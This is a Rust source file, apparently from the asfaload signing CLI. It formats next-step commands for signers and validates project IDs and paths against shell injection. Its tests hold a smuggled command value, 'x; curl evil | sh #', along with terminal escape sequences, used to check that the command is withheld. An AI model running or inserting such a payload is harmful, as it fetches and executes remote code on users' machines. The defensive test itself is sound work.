use anstyle::Style;
use common::AsfaloadHashes;
use features_lib::constants::{PENDING_SIGNERS_DIR, SIGNERS_FILE};
use features_lib::{Forge, SignersConfigMetadata};
use forge_url::{ForgeInfo, ForgeTrait, Forges};
use rest_api_types::RegisterRepoResponse;

use crate::cli::DEFAULT_BACKEND;
use crate::commands::signature_status::signature_status_command_lines;
use crate::utils::{program_name, strip_control_chars};

pub(crate) const BOLD: Style = Style::new().bold();

/// A project ID is safe in a shell command when it has only ASCII letters, digits
/// and `/`, `.`, `-`, `_`, and when no path segment is empty, `.` or `..`.
/// It must not start with `-`, because the command would read it as an option.
pub(crate) fn is_safe_project_id(project_id: &str) -> bool {
    !project_id.is_empty()
        && !project_id.starts_with('-')
        && project_id
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '/' | '.' | '-' | '_'))
        && project_id
            .split('/')
            .all(|segment| !matches!(segment, "" | "." | ".."))
}

/// The path of the pending signers file for a project.
fn expected_signers_file_path(project_id: &str) -> String {
    format!("{project_id}/{PENDING_SIGNERS_DIR}/{SIGNERS_FILE}")
}

/// True when the backend data is safe to put in a command for the signers.
fn is_safe_to_show_command(response: &RegisterRepoResponse) -> bool {
    is_safe_project_id(&response.project_id)
        && response.signers_file_path == expected_signers_file_path(&response.project_id)
}

/// Print the output of a successful register-repo or update-signers.
pub fn print_submission_overview(
    headline: &str,
    response: &RegisterRepoResponse,
    digest: &AsfaloadHashes,
    backend_url: &str,
) {
    let non_default_backend = (backend_url != DEFAULT_BACKEND).then_some(backend_url);
    // anstream removes the styles when stdout is not a terminal.
    anstream::print!(
        "{}",
        submission_overview(
            headline,
            response,
            digest,
            non_default_backend,
            &program_name(),
            true,
        )
    );
}

/// Build the human output after a successful register-repo or update-signers.
///
/// `backend_url` is `Some` only when the user did not use the default backend.
/// Signers must then contact the same backend, so the command shows it.
pub fn submission_overview(
    headline: &str,
    response: &RegisterRepoResponse,
    digest: &AsfaloadHashes,
    backend_url: Option<&str>,
    executable: &str,
    with_ansi: bool,
) -> String {
    let bold = if with_ansi { BOLD } else { Style::new() };
    let mut lines = vec![
        format!(
            "{bold}{headline}:{bold:#} {}",
            strip_control_chars(&response.project_id)
        ),
        String::new(),
    ];
    let file_path =
        is_safe_to_show_command(response).then_some(response.signers_file_path.as_str());
    let to_collect = SignaturesToCollect {
        required_signers: &response.required_signers,
        file_path,
        digest,
        complete_message: "The signers file is active. No more signatures are necessary.",
        unexpected_data_warning: "The backend returned an unexpected project ID or signers file path.",
    };
    lines.extend(signatures_to_collect_lines(
        &to_collect,
        backend_url,
        executable,
        bold,
    ));
    lines.extend(follow_status_lines(&to_collect, backend_url, executable));
    let mut output = lines.join("\n");
    output.push('\n');
    output
}

/// The signatures still to collect for a file, as shown after a submission.
pub(crate) struct SignaturesToCollect<'a> {
    /// Keys that can still sign, empty when the signature is complete.
    pub required_signers: &'a [String],
    /// The path of the file to sign, `None` when the backend data is not
    /// safe to put in a command.
    pub file_path: Option<&'a str>,
    pub digest: &'a AsfaloadHashes,
    /// Shown instead of the keys when no more signatures are necessary.
    pub complete_message: &'a str,
    /// Shown instead of the command when `file_path` is `None`.
    pub unexpected_data_warning: &'a str,
}

/// The heading and the keys that can still sign, one key per line.
pub(crate) fn keys_that_can_sign_lines(keys: &[String], bold: Style) -> Vec<String> {
    std::iter::once(format!("{bold}Keys that can still sign{bold:#}"))
        .chain(
            keys.iter()
                .map(|key| format!("  {}", strip_control_chars(key))),
        )
        .collect()
}

/// Build the lines about the signatures still to collect: the keys that can
/// still sign, and the sign-pending command to send to them.
///
/// `backend_url` is `Some` only when the user did not use the default backend.
pub(crate) fn signatures_to_collect_lines(
    to_collect: &SignaturesToCollect,
    backend_url: Option<&str>,
    executable: &str,
    bold: Style,
) -> Vec<String> {
    if to_collect.required_signers.is_empty() {
        return vec![to_collect.complete_message.to_string()];
    }
    let mut lines = keys_that_can_sign_lines(to_collect.required_signers, bold);
    lines.push(String::new());
    match to_collect.file_path {
        Some(file_path) => {
            lines.push(format!("{bold}Next step{bold:#}"));
            lines.push(
                "  Send this command to the signers. Each signer replaces <secret-key>".to_string(),
            );
            lines.push("  with their secret key file:".to_string());
            lines.push(String::new());
            lines.push(format!("     {executable} sign-pending \\"));
            lines.push(format!("       --digest {} \\", to_collect.digest));
            lines.push(format!("       {file_path} \\"));
            lines.extend(command_tail(backend_url));
        }
        None => {
            lines.push(format!("{bold}Warning{bold:#}"));
            lines.push(format!("  {}", to_collect.unexpected_data_warning));
            lines.push("  For security, the command for the signers is not shown.".to_string());
            lines.push("  Signers can find the file with list-pending.".to_string());
        }
    }
    lines
}

/// Build the lines that tell the submitter how to follow the status of the
/// signature. Empty when no signature is missing, or when the path is not
/// safe to put in a command.
///
/// `backend_url` is `Some` only when the user did not use the default backend.
pub(crate) fn follow_status_lines(
    to_collect: &SignaturesToCollect,
    backend_url: Option<&str>,
    executable: &str,
) -> Vec<String> {
    match to_collect.file_path {
        Some(file_path) if !to_collect.required_signers.is_empty() => {
            let mut lines = vec![
                String::new(),
                "  To follow the status of the signature, run this command:".to_string(),
                String::new(),
            ];
            lines.extend(signature_status_command_lines(
                file_path,
                backend_url,
                executable,
            ));
            lines
        }
        _ => Vec::new(),
    }
}

/// The last lines of a command to copy: the backend URL when it is not the
/// default one, then the secret key placeholder.
///
/// The parts to fill in come last, so the backend URL is before the secret key.
pub(crate) fn command_tail(backend_url: Option<&str>) -> Vec<String> {
    backend_url
        .map(|url| format!("       --backend-url {url} \\"))
        .into_iter()
        .chain(std::iter::once(
            "       --secret-key <secret-key>".to_string(),
        ))
        .collect()
}

/// The kind of release registration to show as example once a signers file
/// is active.
#[derive(Debug, PartialEq, Eq)]
pub enum ReleaseExample {
    /// A GitHub release. Holds the `owner/repo` of the project when it is
    /// safe to put in a command.
    GithubRelease(Option<String>),
    /// Checksums files, for releases that are not on GitHub.
    ChecksumsFiles,
}

/// Select the release registration example for the project of a signers file.
///
/// The owner and repo come from the retrieval URL, because sign-pending
/// checks that URL against the forge before it signs. The backend path is
/// not used.
pub fn release_example_for(metadata: &SignersConfigMetadata) -> ReleaseExample {
    release_example_for_forge(metadata.kind(), github_owner_repo(metadata.retrieval_url()))
}

/// Select the release registration example for a forge. `owner_repo` is
/// used only for GitHub.
fn release_example_for_forge(forge: &Forge, owner_repo: Option<String>) -> ReleaseExample {
    match forge {
        Forge::Github => ReleaseExample::GithubRelease(owner_repo),
        Forge::Gitlab | Forge::FileServer => ReleaseExample::ChecksumsFiles,
    }
}

/// Select the release registration example for the backend path of a
/// signers file, when its metadata is not available.
///
/// Only the host in the path selects the forge. The owner and repo are not
/// taken from the path, because nothing checked the path against the forge.
/// A path that cannot be parsed gives the checksums files example, which
/// applies to all forges.
pub fn release_example_for_backend_path(path: &str) -> ReleaseExample {
    match forge_for_backend_path(path) {
        Some(forge) => release_example_for_forge(&forge, None),
        None => ReleaseExample::ChecksumsFiles,
    }
}

/// The forge of a backend path, which starts with `<scheme>/<host>/<port>/`.
fn forge_for_backend_path(path: &str) -> Option<Forge> {
    let mut parts = path.splitn(4, '/');
    let (scheme, host, port) = (parts.next()?, parts.next()?, parts.next()?);
    let port: u16 = port.parse().ok()?;
    let url = url::Url::parse(&format!("{scheme}://{host}:{port}/")).ok()?;
    let forge = match Forges::from_host(url.host_str()?).ok()? {
        Forges::Github(_) => Forge::Github,
        Forges::Gitlab(_) => Forge::Gitlab,
        Forges::FileServer(_) => Forge::FileServer,
    };
    Some(forge)
}

/// The `owner/repo` of a GitHub URL, when it is safe to put in a command.
fn github_owner_repo(url: &str) -> Option<String> {
    let url = url::Url::parse(url).ok()?;
    let info = ForgeInfo::new(&url).ok()?;
    let owner_repo = format!("{}/{}", info.owner(), info.repo());
    is_safe_project_id(&owner_repo).then_some(owner_repo)
}

/// Print the next step after a signature activated a signers file.
pub fn print_activation_next_step(example: &ReleaseExample, backend_url: &str) {
    let non_default_backend = (backend_url != DEFAULT_BACKEND).then_some(backend_url);
    // anstream removes the styles when stdout is not a terminal.
    anstream::print!(
        "{}",
        activation_next_step(example, non_default_backend, &program_name(), true)
    );
}

/// Build the next step after a signature activated a signers file: an
/// example command to register a release.
///
/// `backend_url` is `Some` only when the user did not use the default backend.
pub fn activation_next_step(
    example: &ReleaseExample,
    backend_url: Option<&str>,
    executable: &str,
    with_ansi: bool,
) -> String {
    let bold = if with_ansi { BOLD } else { Style::new() };
    let mut lines = vec![format!("{bold}Next step{bold:#}")];
    match example {
        ReleaseExample::GithubRelease(owner_repo) => {
            let (owner_repo, to_replace) = match owner_repo {
                Some(owner_repo) => (owner_repo.as_str(), "<tag> and <secret-key>"),
                None => ("<owner>/<repo>", "<owner>/<repo>, <tag> and <secret-key>"),
            };
            lines.push(
                "  The signers file is now active. An artifact signer can register a release."
                    .to_string(),
            );
            lines.push(format!(
                "  Example for a GitHub release. Replace {to_replace}:"
            ));
            lines.push(String::new());
            lines.push(format!("     {executable} register-assets \\"));
            lines.push(format!(
                "       --github-release-url https://github.com/{owner_repo}/releases/tag/<tag> \\"
            ));
            lines.extend(command_tail(backend_url));
            lines.push(String::new());
            lines.push(
                "  Releases on other forges or file servers are registered with their".to_string(),
            );
            lines.push("  checksums files, using --csum-file.".to_string());
        }
        ReleaseExample::ChecksumsFiles => {
            lines.push(
                "  The signers file is now active. An artifact signer can register a release"
                    .to_string(),
            );
            lines.push(
                "  with its checksums files. Replace <checksums-file-url> and <secret-key>:"
                    .to_string(),
            );
            lines.push(String::new());
            lines.push(format!("     {executable} register-assets \\"));
            lines.push("       --csum-file <checksums-file-url> \\".to_string());
            lines.extend(command_tail(backend_url));
            lines.push(String::new());
            lines.push(
                "  --csum-file can be repeated. For a GitHub release, use --github-release-url."
                    .to_string(),
            );
        }
    }
    let mut output = lines.join("\n");
    output.push('\n');
    output
}

#[cfg(test)]
mod tests {
    use super::*;
    use features_lib::constants::{PENDING_SIGNERS_DIR, SIGNERS_DIR, SIGNERS_FILE};

    const PROJECT_ID: &str = "http/localhost/44241/project";

    #[test]
    fn keys_that_can_sign_lines_lists_keys_without_control_chars() {
        let keys = vec!["key1".to_string(), "ke\x1by2".to_string()];
        assert_eq!(
            keys_that_can_sign_lines(&keys, Style::new()),
            vec!["Keys that can still sign", "  key1", "  key2"]
        );
    }

    fn pending_path() -> String {
        format!("{PROJECT_ID}/{PENDING_SIGNERS_DIR}/{SIGNERS_FILE}")
    }

    fn response(required_signers: Vec<&str>) -> RegisterRepoResponse {
        RegisterRepoResponse {
            success: true,
            project_id: PROJECT_ID.to_string(),
            message: "unused".to_string(),
            required_signers: required_signers.into_iter().map(String::from).collect(),
            signature_submission_url: "/v1/signatures".to_string(),
            signers_file_path: pending_path(),
        }
    }

    fn digest() -> AsfaloadHashes {
        common::sha512_for_content(&b"signers file content"[..]).unwrap()
    }

    #[test]
    fn overview_with_missing_signatures_shows_keys_and_sign_command() {
        let keys = vec!["asfaload-pub:key-a", "asfaload-pub:key-b"];
        let output = submission_overview(
            "Repository registered",
            &response(keys),
            &digest(),
            None,
            "asfaload-cli",
            false,
        );
        let expected = format!(
            "Repository registered: http/localhost/44241/project\n\
             \n\
             Keys that can still sign\n  \
             asfaload-pub:key-a\n  \
             asfaload-pub:key-b\n\
             \n\
             Next step\n  \
             Send this command to the signers. Each signer replaces <secret-key>\n  \
             with their secret key file:\n\
             \n     \
             asfaload-cli sign-pending \\\n       \
             --digest {} \\\n       \
             {} \\\n       \
             --secret-key <secret-key>\n\
             \n  \
             To follow the status of the signature, run this command:\n\
             \n     \
             asfaload-cli signature-status \\\n       \
             {} \\\n       \
             --secret-key <secret-key>\n",
            digest(),
            pending_path(),
            pending_path()
        );
        assert_eq!(output, expected);
    }

    #[test]
    fn overview_when_file_is_active_has_no_sign_command() {
        let output = submission_overview(
            "Repository registered",
            &response(vec![]),
            &digest(),
            None,
            "asfaload-cli",
            false,
        );
        assert_eq!(
            output,
            "Repository registered: http/localhost/44241/project\n\
             \n\
             The signers file is active. No more signatures are necessary.\n"
        );
    }

    #[test]
    fn overview_with_non_default_backend_adds_backend_url_before_secret_key() {
        let output = submission_overview(
            "Signers update proposed",
            &response(vec!["asfaload-pub:key-a"]),
            &digest(),
            Some("http://localhost:3000"),
            "asfaload-cli",
            false,
        );
        assert!(
            output.contains(
                "       --backend-url http://localhost:3000 \\\n       --secret-key <secret-key>\n"
            ),
            "backend URL must come just before the secret key placeholder, got: {output}"
        );
        assert_eq!(
            output
                .matches("--backend-url http://localhost:3000")
                .count(),
            2,
            "both the sign-pending and the signature-status commands need the backend URL, got: {output}"
        );
        assert!(output.starts_with("Signers update proposed: "));
    }

    #[test]
    fn overview_with_default_backend_has_no_backend_url() {
        let output = submission_overview(
            "Repository registered",
            &response(vec!["asfaload-pub:key-a"]),
            &digest(),
            None,
            "asfaload-cli",
            false,
        );
        assert!(
            !output.contains("--backend-url"),
            "default backend must not be in the command, got: {output}"
        );
    }

    #[test]
    fn overview_without_ansi_has_no_escape_codes_and_with_ansi_has_some() {
        let build = |with_ansi| {
            submission_overview(
                "Repository registered",
                &response(vec!["asfaload-pub:key-a"]),
                &digest(),
                None,
                "asfaload-cli",
                with_ansi,
            )
        };
        assert!(!build(false).contains('\x1b'));
        assert!(build(true).contains('\x1b'));
    }

    fn overview_for(response: &RegisterRepoResponse) -> String {
        submission_overview(
            "Repository registered",
            response,
            &digest(),
            None,
            "asfaload-cli",
            false,
        )
    }

    fn assert_command_withheld(output: &str) {
        assert!(
            !output.contains("sign-pending"),
            "command must not be shown, got: {output}"
        );
        assert!(
            !output.contains("signature-status"),
            "status command must not be shown, got: {output}"
        );
        assert!(output.contains("Warning"), "warning missing, got: {output}");
        assert!(output.contains("list-pending"), "got: {output}");
    }

    #[test]
    fn overview_withholds_command_when_path_has_shell_injection() {
        let mut r = response(vec!["asfaload-pub:key-a"]);
        r.signers_file_path = "x; curl evil | sh #".to_string();
        assert_command_withheld(&overview_for(&r));
    }

    #[test]
    fn overview_withholds_command_when_path_is_the_active_file() {
        let mut r = response(vec!["asfaload-pub:key-a"]);
        r.signers_file_path = format!("{PROJECT_ID}/{SIGNERS_DIR}/{SIGNERS_FILE}");
        assert_command_withheld(&overview_for(&r));
    }

    #[test]
    fn overview_withholds_command_when_project_id_is_not_safe() {
        for bad in ["http/local host/project", "http/../project", "a/b\x1b[2K"] {
            let mut r = response(vec!["asfaload-pub:key-a"]);
            r.project_id = bad.to_string();
            r.signers_file_path = format!("{bad}/{PENDING_SIGNERS_DIR}/{SIGNERS_FILE}");
            assert_command_withheld(&overview_for(&r));
        }
    }

    #[test]
    fn overview_removes_control_characters_from_keys_and_project_id() {
        let mut r = response(vec!["asfaload-pub:\x1b[2Kkey-a"]);
        r.project_id = "proj\x1b[2Kect".to_string();
        let output = overview_for(&r);
        assert!(!output.contains('\x1b'), "got: {output:?}");
        assert!(output.contains("  asfaload-pub:[2Kkey-a\n"));
        assert!(
            output.contains("registered: proj[2Kect\n"),
            "got: {output:?}"
        );
    }

    #[test]
    fn is_safe_project_id_cases() {
        let cases = [
            ("http/localhost/44241/project", true),
            ("github.com/acme/tool_1-x", true),
            ("", false),
            ("a b", false),
            ("a/../b", false),
            ("a/./b", false),
            ("a//b", false),
            ("/a", false),
            ("a/", false),
            ("a;b", false),
            ("a\x1b", false),
            ("é/a", false),
            ("-a/b", false),
            ("--help", false),
            ("a/-b", true),
        ];
        for (input, expected) in cases {
            assert_eq!(is_safe_project_id(input), expected, "input {input:?}");
        }
    }

    fn metadata(kind: Forge, retrieval_url: &str) -> SignersConfigMetadata {
        SignersConfigMetadata::new(
            kind,
            retrieval_url.to_string(),
            features_lib::VerifiedForgeContent::new_for_test(
                retrieval_url.to_string(),
                "{}".to_string(),
            ),
            chrono::Utc::now(),
        )
    }

    #[test]
    fn release_example_for_cases() {
        let github_raw =
            "https://raw.githubusercontent.com/acme/tool/main/asfaload.signers/index.json";
        let github_blob = "https://github.com/acme/tool/blob/main/asfaload.signers/index.json";
        // (forge, retrieval url, expected example)
        let cases = [
            (
                Forge::Github,
                github_raw,
                ReleaseExample::GithubRelease(Some("acme/tool".to_string())),
            ),
            (
                Forge::Github,
                github_blob,
                ReleaseExample::GithubRelease(Some("acme/tool".to_string())),
            ),
            // A retrieval URL that cannot be parsed gives placeholders.
            (
                Forge::Github,
                "not a url",
                ReleaseExample::GithubRelease(None),
            ),
            // Shell metacharacters must never reach the command.
            (
                Forge::Github,
                "https://raw.githubusercontent.com/ac;me/tool/main/asfaload.signers/index.json",
                ReleaseExample::GithubRelease(None),
            ),
            (
                Forge::Gitlab,
                "https://gitlab.com/acme/tool/-/raw/main/asfaload.signers/index.json",
                ReleaseExample::ChecksumsFiles,
            ),
            (
                Forge::FileServer,
                "http://localhost:8080/acme/asfaload.signers/index.json",
                ReleaseExample::ChecksumsFiles,
            ),
        ];
        for (kind, url, expected) in cases {
            assert_eq!(
                release_example_for(&metadata(kind, url)),
                expected,
                "retrieval url {url}"
            );
        }
    }

    #[test]
    fn release_example_for_backend_path_cases() {
        let signers = format!("{PENDING_SIGNERS_DIR}/{SIGNERS_FILE}");
        // (backend path, expected example)
        let cases = [
            (
                format!("https/github.com/443/acme/tool/{signers}"),
                ReleaseExample::GithubRelease(None),
            ),
            (
                format!("https/raw.githubusercontent.com/443/acme/tool/{signers}"),
                ReleaseExample::GithubRelease(None),
            ),
            (
                format!("https/gitlab.com/443/acme/tool/{signers}"),
                ReleaseExample::ChecksumsFiles,
            ),
            (
                format!("http/files.example.com/8080/acme/{signers}"),
                ReleaseExample::ChecksumsFiles,
            ),
            // Paths that cannot be parsed give the checksums files example.
            (
                format!("https/github.com/notaport/acme/tool/{signers}"),
                ReleaseExample::ChecksumsFiles,
            ),
            (
                "https/github.com".to_string(),
                ReleaseExample::ChecksumsFiles,
            ),
            (String::new(), ReleaseExample::ChecksumsFiles),
        ];
        for (path, expected) in cases {
            assert_eq!(
                release_example_for_backend_path(&path),
                expected,
                "backend path {path:?}"
            );
        }
    }

    #[test]
    fn activation_next_step_for_github_release() {
        let output = activation_next_step(
            &ReleaseExample::GithubRelease(Some("acme/tool".to_string())),
            None,
            "asfaload-cli",
            false,
        );
        assert_eq!(
            output,
            "Next step\n  \
             The signers file is now active. An artifact signer can register a release.\n  \
             Example for a GitHub release. Replace <tag> and <secret-key>:\n\
             \n     \
             asfaload-cli register-assets \\\n       \
             --github-release-url https://github.com/acme/tool/releases/tag/<tag> \\\n       \
             --secret-key <secret-key>\n\
             \n  \
             Releases on other forges or file servers are registered with their\n  \
             checksums files, using --csum-file.\n"
        );
    }

    #[test]
    fn activation_next_step_for_github_release_without_owner_repo() {
        let output = activation_next_step(
            &ReleaseExample::GithubRelease(None),
            None,
            "asfaload-cli",
            false,
        );
        assert!(
            output.contains("Replace <owner>/<repo>, <tag> and <secret-key>:\n"),
            "got: {output}"
        );
        assert!(
            output.contains("https://github.com/<owner>/<repo>/releases/tag/<tag> \\\n"),
            "got: {output}"
        );
    }

    #[test]
    fn activation_next_step_for_checksums_files() {
        let output =
            activation_next_step(&ReleaseExample::ChecksumsFiles, None, "asfaload-cli", false);
        assert_eq!(
            output,
            "Next step\n  \
             The signers file is now active. An artifact signer can register a release\n  \
             with its checksums files. Replace <checksums-file-url> and <secret-key>:\n\
             \n     \
             asfaload-cli register-assets \\\n       \
             --csum-file <checksums-file-url> \\\n       \
             --secret-key <secret-key>\n\
             \n  \
             --csum-file can be repeated. For a GitHub release, use --github-release-url.\n"
        );
    }

    #[test]
    fn activation_next_step_adds_non_default_backend_before_secret_key() {
        for example in [
            ReleaseExample::GithubRelease(Some("acme/tool".to_string())),
            ReleaseExample::ChecksumsFiles,
        ] {
            let output = activation_next_step(
                &example,
                Some("http://localhost:3000"),
                "asfaload-cli",
                false,
            );
            assert!(
                output.contains(
                    "       --backend-url http://localhost:3000 \\\n       --secret-key <secret-key>\n"
                ),
                "backend URL must come just before the secret key placeholder, got: {output}"
            );
        }
    }

    #[test]
    fn activation_next_step_without_ansi_has_no_escape_codes_and_with_ansi_has_some() {
        let build = |with_ansi| {
            activation_next_step(
                &ReleaseExample::ChecksumsFiles,
                None,
                "asfaload-cli",
                with_ansi,
            )
        };
        assert!(!build(false).contains('\x1b'));
        assert!(build(true).contains('\x1b'));
    }
}
